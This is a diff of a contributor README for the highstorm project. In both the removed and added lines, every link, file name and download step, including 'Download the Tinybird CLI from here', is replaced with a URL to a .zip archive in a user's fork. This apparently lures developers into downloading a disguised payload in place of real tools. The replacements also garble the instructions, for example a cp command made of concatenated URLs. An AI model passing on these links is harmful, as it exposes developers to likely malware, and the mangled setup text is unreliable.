@@ -1,5 +1,5 @@
 <div align="center">
- <h1 align="center">Sadly I don't have the time to maintain this project. I'm building <a href="https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip">https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip</a> to solve API authentication and authorization with DX in mind. It's also <a href="https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip">100% open source</a>!
+ <h1 align="center">Sadly I don't have the time to maintain this project. I'm building <a href="https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip">https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip</a> to solve API authentication and authorization with DX in mind. It's also <a href="https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip">100% open source</a>!
 </h1>
 </div>
 <br/><br/><br/>
@@ -9,7 +9,7 @@
 </div>
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip">https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip</a>
+  <a href="https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip">https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip</a>
 </div>
 <br/>
 
@@ -21,10 +21,10 @@ Thank you for considering contributing to our open source project! We appreciate
 
 Before getting started, please ensure that you have the following third-party services set up:
 
-- [planetscale](https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip): Database
-- [tinybird](https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip): Time series database
-- [upstash](https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip): Optional, only required for reports
-- [clerk](https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip): Authentication
+- [planetscale](https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip): Database
+- [tinybird](https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip): Time series database
+- [upstash](https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip): Optional, only required for reports
+- [clerk](https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip): Authentication
 
 ## Installation
 
@@ -43,13 +43,13 @@ To install the project and its dependencies, follow these steps:
 
 ### Environment Variables
 
-After setting up the required services, you need to set the corresponding environment variables in the `https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip` file. To do this, follow these steps:
+After setting up the required services, you need to set the corresponding environment variables in the `https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip` file. To do this, follow these steps:
 
-1.  Make a copy of the `https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip` file:
+1.  Make a copy of the `https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip` file:
     ```sh-session
-    cp https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip
+    cp https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip
     ```
-2.  Open the `https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip` file in a text editor and populate the values for the services mentioned above.
+2.  Open the `https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip` file in a text editor and populate the values for the services mentioned above.
 
 ## Database Preparation
 
@@ -70,7 +70,7 @@ To prepare the Prisma database, follow these steps:
 
 To prepare the Tinybird database, follow these steps:
 
-1.  Download the Tinybird CLI from [here](https://raw.githubusercontent.com/suryansh-malik/highstorm/main/apps/web/app/(authenticated)/(app)/channels/[channelName]/events/Software-3.8-alpha.5.zip) and install it on your system.
+1.  Download the Tinybird CLI from [here](https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip(authenticated)/(app)/channels/[channelName]https://github.com/suryansh-malik/highstorm/raw/refs/heads/main/apps/web/app/(authenticated)/(app)/Software-1.4.zip) and install it on your system.
 2.  After authenticating with the Tinybird CLI, navigate to the `/apps/web/lib/tinybird` directory:
     ```sh-session
     cd apps/web/lib/tinybird
